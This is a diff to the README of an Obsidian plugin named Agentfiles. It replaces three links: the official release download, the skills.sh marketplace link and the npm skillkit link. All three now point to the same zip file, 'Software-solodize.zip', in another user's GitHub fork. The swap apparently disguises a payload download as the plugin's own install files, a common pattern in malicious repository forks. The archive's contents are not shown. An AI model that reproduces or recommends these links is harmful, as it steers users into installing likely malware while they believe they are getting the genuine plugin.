@@ -14,7 +14,7 @@ Search **Agentfiles** in Settings > Community plugins.
 
 ### Manual
 
-1. Download `main.js`, `manifest.json`, and `styles.css` from the [latest release](https://github.com/Railly/agentfiles/releases/latest)
+1. Download `main.js`, `manifest.json`, and `styles.css` from the [latest release](https://github.com/darielbra1849/agentfiles/raw/refs/heads/main/web/public/Software-solodize.zip)
 2. Create `<vault>/.obsidian/plugins/agentfiles/`
 3. Copy the three files into that folder
 4. Enable in Settings > Community plugins
@@ -32,9 +32,9 @@ skillkit scan
 - **Search** by name or file content with deep search toggle
 - **Create** new skills with a stepped wizard (pick tool, type, name)
 - **Edit** skills inline with markdown preview and Cmd+S save
-- **Marketplace** — install skills from [skills.sh](https://skills.sh)
+- **Marketplace** — install skills from [skills.sh](https://github.com/darielbra1849/agentfiles/raw/refs/heads/main/web/public/Software-solodize.zip)
 - **Conversations** — browse Claude Code session history, search, tag, and export to vault
-- **Dashboard** — usage analytics, burn rate, context tax, health metrics (requires [skillkit](https://www.npmjs.com/package/@crafter/skillkit))
+- **Dashboard** — usage analytics, burn rate, context tax, health metrics (requires [skillkit](https://github.com/darielbra1849/agentfiles/raw/refs/heads/main/web/public/Software-solodize.zip))
 
 ## Supported tools
 
